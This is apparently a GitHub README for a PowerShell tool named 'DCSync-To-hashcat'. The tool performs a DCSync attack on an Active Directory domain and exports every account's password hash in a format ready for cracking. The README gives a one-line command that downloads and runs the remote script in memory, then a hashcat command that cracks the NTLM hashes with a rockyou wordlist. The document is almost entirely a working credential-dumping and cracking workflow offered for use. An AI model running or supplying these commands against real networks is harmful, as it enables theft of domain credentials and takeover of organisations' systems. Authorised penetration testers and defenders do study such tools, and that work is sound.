# DCSync-To-hashcat
Performs DCSync, extracts all hashes in a hashcat friendly format

Execute from GitHub:

```
IEX(IWR -usebasicparsing https://raw.githubusercontent.com/The-Viper-One/DCSync-To-Hashcat/main/DCSync-To-hashcat.ps1)
```

![image](https://user-images.githubusercontent.com/68926315/222810211-d14f53eb-aff3-42ff-919a-0f123308ddb6.png)

# hashcat

The results can be copied over to file and run againt Hashcat
```
hashcat -a 0 -m 1000 hashes Wordlists/rockyou2021.txt
```
